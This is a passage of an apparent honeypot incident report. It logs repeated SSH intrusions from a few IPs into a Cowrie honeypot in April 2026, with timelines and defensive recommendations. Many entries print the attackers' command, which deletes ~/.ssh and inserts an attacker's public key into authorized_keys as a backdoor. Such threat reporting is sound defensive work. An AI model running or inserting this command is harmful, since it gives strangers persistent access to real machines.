| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:51:51` | `cowrie.session.connect` |
| `2026-04-04 08:51:51` | `cowrie.client.version` |
| `2026-04-04 08:51:51` | `cowrie.client.kex` |
| `2026-04-04 08:51:52` | `cowrie.login.success` |
| `2026-04-04 08:51:52` | `cowrie.session.params` |
| `2026-04-04 08:51:52` | `cowrie.command.input` |
| `2026-04-04 08:51:52` | `cowrie.command.failed` |
| `2026-04-04 08:51:52` | `cowrie.log.closed` |
| `2026-04-04 08:51:53` | `cowrie.session.params` |
| `2026-04-04 08:51:53` | `cowrie.command.input` |
| `2026-04-04 08:51:53` | `cowrie.session.file_download` |
| `2026-04-04 08:51:53` | `cowrie.log.closed` |
| `2026-04-04 08:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9356aaa3f3c7

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:51 |
| **Last Seen** | 2026-04-04 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:51:55` | `cowrie.session.connect` |
| `2026-04-04 08:51:55` | `cowrie.client.version` |
| `2026-04-04 08:51:55` | `cowrie.client.kex` |
| `2026-04-04 08:51:56` | `cowrie.login.success` |
| `2026-04-04 08:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7873cd1f59a

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:54 |
| **Last Seen** | 2026-04-04 08:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:54:17` | `cowrie.session.connect` |
| `2026-04-04 08:54:17` | `cowrie.client.version` |
| `2026-04-04 08:54:17` | `cowrie.client.kex` |
| `2026-04-04 08:54:18` | `cowrie.login.success` |
| `2026-04-04 08:54:18` | `cowrie.session.params` |
| `2026-04-04 08:54:18` | `cowrie.command.input` |
| `2026-04-04 08:54:18` | `cowrie.command.failed` |
| `2026-04-04 08:54:18` | `cowrie.log.closed` |
| `2026-04-04 08:54:19` | `cowrie.session.params` |
| `2026-04-04 08:54:19` | `cowrie.command.input` |
| `2026-04-04 08:54:19` | `cowrie.session.file_download` |
| `2026-04-04 08:54:19` | `cowrie.log.closed` |
| `2026-04-04 08:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1673b1de509

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 08:54 |
| **Last Seen** | 2026-04-04 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 08:54:21` | `cowrie.session.connect` |
| `2026-04-04 08:54:21` | `cowrie.client.version` |
| `2026-04-04 08:54:22` | `cowrie.client.kex` |
| `2026-04-04 08:54:22` | `cowrie.login.success` |
| `2026-04-04 08:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c2141c01a1

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:01 |
| **Last Seen** | 2026-04-04 09:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:01:32` | `cowrie.session.connect` |
| `2026-04-04 09:01:32` | `cowrie.client.version` |
| `2026-04-04 09:01:32` | `cowrie.client.kex` |
| `2026-04-04 09:01:33` | `cowrie.login.success` |
| `2026-04-04 09:01:33` | `cowrie.session.params` |
| `2026-04-04 09:01:33` | `cowrie.command.input` |
| `2026-04-04 09:01:33` | `cowrie.command.failed` |
| `2026-04-04 09:01:33` | `cowrie.log.closed` |
| `2026-04-04 09:01:34` | `cowrie.session.params` |
| `2026-04-04 09:01:34` | `cowrie.command.input` |
| `2026-04-04 09:01:34` | `cowrie.session.file_download` |
| `2026-04-04 09:01:34` | `cowrie.log.closed` |
| `2026-04-04 09:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce5d53de716

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:01 |
| **Last Seen** | 2026-04-04 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:01:36` | `cowrie.session.connect` |
| `2026-04-04 09:01:36` | `cowrie.client.version` |
| `2026-04-04 09:01:36` | `cowrie.client.kex` |
| `2026-04-04 09:01:37` | `cowrie.login.success` |
| `2026-04-04 09:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ee3111b305

| Field | Detail |
|---|---|
| **Source IP** | `202.125.94[.]71` |
| **First Seen** | 2026-04-04 09:15 |
| **Last Seen** | 2026-04-04 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:15:44` | `cowrie.session.connect` |
| `2026-04-04 09:15:44` | `cowrie.client.version` |
| `2026-04-04 09:15:44` | `cowrie.client.kex` |
| `2026-04-04 09:15:44` | `cowrie.login.success` |
| `2026-04-04 09:15:44` | `cowrie.session.params` |
| `2026-04-04 09:15:44` | `cowrie.command.input` |
| `2026-04-04 09:15:44` | `cowrie.command.failed` |
| `2026-04-04 09:15:44` | `cowrie.log.closed` |
| `2026-04-04 09:15:45` | `cowrie.session.params` |
| `2026-04-04 09:15:45` | `cowrie.command.input` |
| `2026-04-04 09:15:45` | `cowrie.session.file_download` |
| `2026-04-04 09:15:45` | `cowrie.log.closed` |
| `2026-04-04 09:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.125.94[.]71` to AbuseIPDB if not already reported
- [ ] Block `202.125.94[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a457ba176809

| Field | Detail |
|---|---|
| **Source IP** | `202.125.94[.]71` |
| **First Seen** | 2026-04-04 09:15 |
| **Last Seen** | 2026-04-04 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:15:46` | `cowrie.session.connect` |
| `2026-04-04 09:15:46` | `cowrie.client.version` |
| `2026-04-04 09:15:46` | `cowrie.client.kex` |
| `2026-04-04 09:15:47` | `cowrie.login.success` |
| `2026-04-04 09:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.125.94[.]71` to AbuseIPDB if not already reported
- [ ] Block `202.125.94[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913a81cec45e

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:16 |
| **Last Seen** | 2026-04-04 09:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:16:39` | `cowrie.session.connect` |
| `2026-04-04 09:16:39` | `cowrie.client.version` |
| `2026-04-04 09:16:39` | `cowrie.client.kex` |
| `2026-04-04 09:16:40` | `cowrie.login.success` |
| `2026-04-04 09:16:40` | `cowrie.session.params` |
| `2026-04-04 09:16:40` | `cowrie.command.input` |
| `2026-04-04 09:16:40` | `cowrie.command.failed` |
| `2026-04-04 09:16:40` | `cowrie.log.closed` |
| `2026-04-04 09:16:40` | `cowrie.session.params` |
| `2026-04-04 09:16:40` | `cowrie.command.input` |
| `2026-04-04 09:16:41` | `cowrie.session.file_download` |
| `2026-04-04 09:16:41` | `cowrie.log.closed` |
| `2026-04-04 09:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc8f9f91a38

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:16 |
| **Last Seen** | 2026-04-04 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:16:43` | `cowrie.session.connect` |
| `2026-04-04 09:16:43` | `cowrie.client.version` |
| `2026-04-04 09:16:43` | `cowrie.client.kex` |
| `2026-04-04 09:16:44` | `cowrie.login.success` |
| `2026-04-04 09:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e089c8c1832

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:19 |
| **Last Seen** | 2026-04-04 09:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:19:14` | `cowrie.session.connect` |
| `2026-04-04 09:19:14` | `cowrie.client.version` |
| `2026-04-04 09:19:14` | `cowrie.client.kex` |
| `2026-04-04 09:19:15` | `cowrie.login.success` |
| `2026-04-04 09:19:15` | `cowrie.session.params` |
| `2026-04-04 09:19:15` | `cowrie.command.input` |
| `2026-04-04 09:19:15` | `cowrie.command.failed` |
| `2026-04-04 09:19:15` | `cowrie.log.closed` |
| `2026-04-04 09:19:15` | `cowrie.session.params` |
| `2026-04-04 09:19:15` | `cowrie.command.input` |
| `2026-04-04 09:19:16` | `cowrie.session.file_download` |
| `2026-04-04 09:19:16` | `cowrie.log.closed` |
| `2026-04-04 09:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b355c5287ce

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:19 |
| **Last Seen** | 2026-04-04 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:19:17` | `cowrie.session.connect` |
| `2026-04-04 09:19:17` | `cowrie.client.version` |
| `2026-04-04 09:19:18` | `cowrie.client.kex` |
| `2026-04-04 09:19:18` | `cowrie.login.success` |
| `2026-04-04 09:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5538b24e3b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:21 |
| **Last Seen** | 2026-04-04 09:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:21:30` | `cowrie.session.connect` |
| `2026-04-04 09:21:30` | `cowrie.client.version` |
| `2026-04-04 09:21:30` | `cowrie.client.kex` |
| `2026-04-04 09:21:31` | `cowrie.login.success` |
| `2026-04-04 09:21:31` | `cowrie.session.params` |
| `2026-04-04 09:21:31` | `cowrie.command.input` |
| `2026-04-04 09:21:31` | `cowrie.command.failed` |
| `2026-04-04 09:21:31` | `cowrie.log.closed` |
| `2026-04-04 09:21:31` | `cowrie.session.params` |
| `2026-04-04 09:21:31` | `cowrie.command.input` |
| `2026-04-04 09:21:31` | `cowrie.session.file_download` |
| `2026-04-04 09:21:31` | `cowrie.log.closed` |
| `2026-04-04 09:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea16d2de7e7

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:21 |
| **Last Seen** | 2026-04-04 09:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:21:33` | `cowrie.session.connect` |
| `2026-04-04 09:21:33` | `cowrie.client.version` |
| `2026-04-04 09:21:33` | `cowrie.client.kex` |
| `2026-04-04 09:21:34` | `cowrie.login.success` |
| `2026-04-04 09:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19933116aa64

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:24 |
| **Last Seen** | 2026-04-04 09:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:24:09` | `cowrie.session.connect` |
| `2026-04-04 09:24:09` | `cowrie.client.version` |
| `2026-04-04 09:24:09` | `cowrie.client.kex` |
| `2026-04-04 09:24:10` | `cowrie.login.success` |
| `2026-04-04 09:24:10` | `cowrie.session.params` |
| `2026-04-04 09:24:10` | `cowrie.command.input` |
| `2026-04-04 09:24:10` | `cowrie.command.failed` |
| `2026-04-04 09:24:11` | `cowrie.log.closed` |
| `2026-04-04 09:24:11` | `cowrie.session.params` |
| `2026-04-04 09:24:11` | `cowrie.command.input` |
| `2026-04-04 09:24:11` | `cowrie.session.file_download` |
| `2026-04-04 09:24:11` | `cowrie.log.closed` |
| `2026-04-04 09:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9a15326f24

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:24 |
| **Last Seen** | 2026-04-04 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:24:13` | `cowrie.session.connect` |
| `2026-04-04 09:24:13` | `cowrie.client.version` |
| `2026-04-04 09:24:14` | `cowrie.client.kex` |
| `2026-04-04 09:24:14` | `cowrie.login.success` |
| `2026-04-04 09:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ca36aa1082

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:25 |
| **Last Seen** | 2026-04-04 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:25:53` | `cowrie.session.connect` |
| `2026-04-04 09:25:53` | `cowrie.client.version` |
| `2026-04-04 09:25:53` | `cowrie.client.kex` |
| `2026-04-04 09:25:53` | `cowrie.login.success` |
| `2026-04-04 09:25:53` | `cowrie.session.params` |
| `2026-04-04 09:25:53` | `cowrie.command.input` |
